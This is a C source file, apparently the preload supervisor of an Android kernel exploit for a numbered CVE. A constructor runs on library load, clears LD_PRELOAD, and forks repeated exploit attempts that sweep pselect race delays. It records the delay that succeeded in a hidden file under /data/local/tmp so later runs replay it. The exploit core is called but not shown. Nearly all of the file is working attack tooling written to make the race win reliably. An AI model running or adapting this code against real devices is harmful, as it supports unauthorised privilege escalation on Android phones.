#include "common.h"

#define DEFAULT_EXPLOIT_ATTEMPTS 16
#define DEFAULT_PSELECT_DELAY_USEC 20000

/* Timing profile: remembers the delay that last succeeded on this exact
 * device/boot-profile so attempt #1 replays the winner instead of
 * re-sweeping. Format: "best_delay=<usec> wins=<n>\n". Written atomically
 * (tmp + rename). Disable with TIMING_PROFILE=0. */
#define TIMING_PROFILE_PATH "/data/local/tmp/.cve43499_timing"

static int timing_profile_best(void) {
  const char *off = getenv("TIMING_PROFILE");
  if (off && strcmp(off, "0") == 0) {
    return -1;
  }
  char buf[64];
  int fd = open(TIMING_PROFILE_PATH, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0 || n >= (ssize_t)sizeof(buf)) {
    errno = saved_errno;
    return -1;
  }
  buf[n] = 0;
  int best = -1, wins = 0;
  if (sscanf(buf, "best_delay=%d wins=%d", &best, &wins) != 2) {
    return -1;
  }
  if (best < 0 || best > 1000000 || wins <= 0) {
    return -1;
  }
  pr_success("timing profile: best_delay=%d wins=%d\n", best, wins);
  return best;
}

static void timing_profile_record(int delay_usec) {
  const char *off = getenv("TIMING_PROFILE");
  if (off && strcmp(off, "0") == 0) {
    return;
  }
  char buf[64];
  int wins = 1;
  int fd = open(TIMING_PROFILE_PATH, O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    char old[64];
    ssize_t n = read(fd, old, sizeof(old) - 1);
    close(fd);
    if (n > 0 && n < (ssize_t)sizeof(old)) {
      old[n] = 0;
      int prev_best = -1, prev_wins = 0;
      if (sscanf(old, "best_delay=%d wins=%d", &prev_best, &prev_wins) == 2 &&
          prev_best == delay_usec && prev_wins > 0) {
        wins = prev_wins + 1;
      }
    }
  }
  int len = snprintf(buf, sizeof(buf), "best_delay=%d wins=%d\n",
                     delay_usec, wins);
  if (len <= 0 || (size_t)len >= sizeof(buf)) {
    return;
  }
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s.tmp", TIMING_PROFILE_PATH);
  fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    return;
  }
  ssize_t off_w = 0;
  while (off_w < len) {
    ssize_t n = write(fd, buf + off_w, (size_t)(len - off_w));
    if (n <= 0) {
      if (errno == EINTR) {
        continue;
      }
      close(fd);
      return;
    }
    off_w += n;
  }
  close(fd);
  rename(tmp, TIMING_PROFILE_PATH);
  pr_success("timing profile: recorded best_delay=%d wins=%d\n",
             delay_usec, wins);
}

static unsigned long long rmg_trace4_us(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
    return 0;
  return (unsigned long long)ts.tv_sec * 1000000ULL +
         (unsigned long long)ts.tv_nsec / 1000ULL;
}

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
  return delay < 0 ? 0 : delay;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d\n",
             getpid(), max_attempts, base_delay);

  int profile_best = timing_profile_best();

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    /* Attempt #1 replays the last known winner on this device; the rest
     * keep sweeping so a stale profile can never wedge the run. */
    int delay_usec = (attempt == 1 && profile_best >= 0)
        ? profile_best
        : attempt_delay_usec(base_delay,
                             attempt - (profile_best >= 0 ? 1 : 0));
    unsigned long long attempt_start_us = rmg_trace4_us();
    pr_info("[trace4-supervisor] phase=before-fork attempt=%d/%d t_us=%llu delay=%d\n",
            attempt, max_attempts, attempt_start_us, delay_usec);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
      int rc = run_exploit(1, argv);
      pr_info("[trace4-supervisor] phase=child-return attempt=%d/%d pid=%d rc=%d t_us=%llu\n",
              attempt, max_attempts, getpid(), rc, rmg_trace4_us());
      _exit(rc);
    }

    int status = 0;
    pid_t waited;
    do {
      waited = waitpid(child, &status, 0);
    } while (waited < 0 && errno == EINTR);
    unsigned long long reaped_us = rmg_trace4_us();
    pr_info("[trace4-supervisor] phase=child-reaped attempt=%d/%d child=%d "
            "raw_status=%d elapsed_us=%llu t_us=%llu\n",
            attempt, max_attempts, child, status,
            reaped_us >= attempt_start_us ? reaped_us - attempt_start_us : 0,
            reaped_us);
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      timing_profile_record(delay_usec);
      return;
    }

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                 WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
  _exit(1);
}
